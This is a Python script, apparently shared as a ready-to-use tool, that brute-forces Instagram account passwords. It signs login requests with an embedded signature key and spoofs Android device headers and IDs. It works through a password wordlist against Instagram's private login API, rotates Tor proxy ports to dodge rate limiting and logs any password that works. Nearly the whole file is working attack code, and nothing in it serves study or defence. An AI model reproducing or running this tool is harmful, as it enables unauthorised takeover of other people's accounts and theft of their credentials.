#!/usr/bin/env python3
# Coded by: Mr.X
# Instagram Brute-Force | ✅ Ctrl+C WORKS in Termux | Password does not match

import os
import sys
import time
import random
import hashlib
import hmac
import json
import argparse
from pathlib import Path
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# === Konfigurasi ===
IG_SIG_KEY = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
APP_ID = "567067343352427"

HEADERS = {
    "User-Agent": "Instagram 213.1.0.28.117 Android (29/10; 480dpi; 1080x2048; samsung; SM-G975F; beyond2; exynos9820; en_US)",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate",
    "X-IG-App-ID": APP_ID,
    "X-IG-Connection-Type": "WIFI",
    "X-IG-Capabilities": "3brTvx8=",
    "X-IG-Connection-Speed": f"{random.randint(1000, 3700)}kbps",
    "Connection": "close"
}

TOR_PORTS = [9050, 9052, 9053, 9054, 9055]
SESSION_DIR = Path("sessions")
SESSION_DIR.mkdir(exist_ok=True)
FOUND_FILE = "found.instainsane"
NOT_TESTED_FILE = "nottested.lst"

# === UTILITAS CYBERPUNK (SAMA) ===
def cyber_print(text, mode="info"):
    RESET = "\033[0m"
    COLORS = {
        "banner": "\033[1;95m", "info": "\033[1;96m", "warn": "\033[1;91m",
        "success": "\033[1;92m", "attempt": "\033[1;97m", "highlight": "\033[1;95m",
    }
    color = COLORS.get(mode, RESET)
    print(f"{color}{text}{RESET}")

def cyber_input(prompt, style="highlight"):
    RESET = "\033[0m"
    COLORS = {"highlight": "\033[1;95m"}
    color = COLORS.get(style, COLORS["highlight"])
    sys.stdout.write(f"{color}{prompt}{RESET}")
    sys.stdout.flush()
    return input()

def cyber_banner():
    cyber_print(r"""                                                                                                                          
██ ▄▄  ▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄  ██ ▄▄  ▄▄  ▄▄▄▄  ▄▄▄  ▄▄  ▄▄ ▄▄▄▄▄ 
██ ███▄██ ███▄▄   ██  ██▀██ ██ ███▄██ ███▄▄ ██▀██ ███▄██ ██▄▄  
██ ██ ▀██ ▄▄██▀   ██  ██▀██ ██ ██ ▀██ ▄▄██▀ ██▀██ ██ ▀██ ██▄▄▄ 
                                                               
    """, "banner")
    cyber_print("         ≡≡≡ INSTA-BRUTE: Create by Mr.X ≡≡≡", "highlight")
    cyber_print("         [Termux Compatible • Password Feedback Improved]\n", "info")

def glitch_text(text):
    for _ in range(2):
        cyber_print(text, "success")  # 'glitch' tidak didefinisi, pakai success
        time.sleep(0.07)
        sys.stdout.write("\033[F\033[K")
        sys.stdout.flush()
        time.sleep(0.07)
    cyber_print(text, "success")

def check_tor():
    cyber_print("[*] Verifying Tor on port 9050...", "info")
    try:
        r = requests.get(
            "https://check.torproject.org/api/ip",
            proxies={"https": "socks5h://127.0.0.1:9050"},
            timeout=10
        )
        if r.json().get("IsTor"):
            cyber_print("[✓] Tor is active", "success")
            return True
    except Exception:
        pass
    cyber_print("[!] Tor not detected. Run: tor &", "warn")
    return False

# === FUNGSI INTI ===
def gen_device_id(): return f"android-{random_hex(16)}"
def gen_uuid(): return random_hex(32)
def gen_phone_id(): return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
def random_hex(n): return os.urandom(n // 2).hex()

def sign_data(json_string: str) -> str:
    return hmac.new(IG_SIG_KEY.encode("utf-8"), json_string.encode("utf-8"), hashlib.sha256).hexdigest()

def build_login_data(username, password, device_id, uuid, phone_id):
    data = {
        "phone_id": phone_id, "_csrftoken": "missing", "username": username,
        "guid": uuid, "device_id": device_id, "password": password, "login_attempt_count": "0"
    }
    json_data = json.dumps(data, separators=(",", ":"))
    signed_body = f"{sign_data(json_data)}.{json_data}"
    return {"signed_body": signed_body, "ig_sig_key_version": "4"}

def login_attempt(username, password, tor_port):
    proxy = {"https": f"socks5h://127.0.0.1:{tor_port}"}
    device_id = gen_device_id()
    uuid = gen_uuid()
    phone_id = gen_phone_id()
    post_data = build_login_data(username, password, device_id, uuid, phone_id)

    try:
        r = requests.post(
            "https://i.instagram.com/api/v1/accounts/login/",
            data=post_data,
            headers=HEADERS,
            proxies=proxy,
            timeout=8,
            verify=False
        )
        text = r.text.lower()
        if "logged_in_user" in text:
            return "success"
        elif "challenge" in text or "checkpoint" in text:
            return "challenge"
        else:
            return "fail"
    except (requests.RequestException, OSError, ValueError):
        return "error"
    # JANGAN gunakan `except:` — biarkan KeyboardInterrupt & SystemExit lewat!

def save_found(username, password):
    with open(FOUND_FILE, "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")
    glitch_text(f" [*] Password Found: {password}")
    cyber_print(f" [*] Saved: {FOUND_FILE}", "success")

def save_nottested(password):
    with open(NOT_TESTED_FILE, "a") as f:
        f.write(password + "\n")

def save_session(username, wordlist, last_pass):
    token_line = 0
    with open(wordlist, "r") as f:
        for i, line in enumerate(f, 1):
            if line.strip() == last_pass:
                token_line = i
                break
    session_file = SESSION_DIR / f"store.session.{username}.{int(time.time())}"
    with open(session_file, "w") as f:
        f.write(f'user="{username}"\n')
        f.write(f'pass="{last_pass}"\n')
        f.write(f'wl_pass="{wordlist}"\n')
        f.write(f'token="{token_line}"\n')
    cyber_print("Session saved.", "info")

# === MAIN ===
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--resume", help="Resume from session file", action="store_true")
    args = parser.parse_args()

    cyber_banner()
    if not check_tor():
        sys.exit(1)

    if args.resume:
        sessions = list(SESSION_DIR.glob("store.session.*"))
        if not sessions:
            cyber_print("[*] No sessions found", "warn")
            sys.exit(1)
        for i, s in enumerate(sessions, 1):
            cyber_print(f"{i}: {s.name}", "info")
        try:
            choice = int(cyber_input("Choose session: ").strip() or "1") - 1
            env = {}
            with open(sessions[choice]) as f:
                for line in f:
                    if "=" in line:
                        k, v = line.strip().split("=", 1)
                        env[k] = v.strip('"')
            username = env["user"]
            wordlist = env["wl_pass"]
            start_line = int(env["token"])
        except (IndexError, KeyError, ValueError):
            cyber_print("[!] Invalid session file", "warn")
            sys.exit(1)
    else:
        username = cyber_input("Username account: ").strip()
        wordlist_input = cyber_input("Password List (Enter for 'passwords.lst'): ").strip()
        wordlist = wordlist_input if wordlist_input else "passwords.lst"
        start_line = 0

    if not Path(wordlist).exists():
        cyber_print(f"Wordlist '{wordlist}' not found!", "warn")
        sys.exit(1)

    cyber_print("[✓] Starting brute-force...", "success")
    cyber_print("[!] Press Ctrl+C to stop and save session", "info")

    with open(wordlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
    total = len(passwords)
    port_index = 0

    try:
        for idx, pwd in enumerate(passwords[start_line:], start=start_line):
            tor_port = TOR_PORTS[port_index % len(TOR_PORTS)]
            port_index += 1

            cyber_print(f"Trying pass ({idx+1}/{total}): \"{pwd}\"", "attempt")
            result = login_attempt(username, pwd, tor_port)

            if result in ("success", "challenge"):
                save_found(username, pwd)
                if os.path.exists(NOT_TESTED_FILE):
                    os.remove(NOT_TESTED_FILE)
                cyber_print("[✓] Brute-force completed successfully.", "success")
                return
            else:
                cyber_print(f"[✗] Password does not match: {pwd}", "warn")
                save_nottested(pwd)

            if (idx + 1) % 20 == 0:
                save_session(username, wordlist, pwd)

        cyber_print("[*] Brute-force finished (no password found).", "info")

    except KeyboardInterrupt:
        cyber_print("\n\n[!] Brute-force interrupted by user.", "warn")
        if 'pwd' in locals():
            save_session(username, wordlist, pwd)
        cyber_print("[*] Session saved. Exiting immediately...", "info")
        os._exit(0)  # ✅ KELUAR SEKETIKA — TIDAK LANJUT!

if __name__ == "__main__":
    main()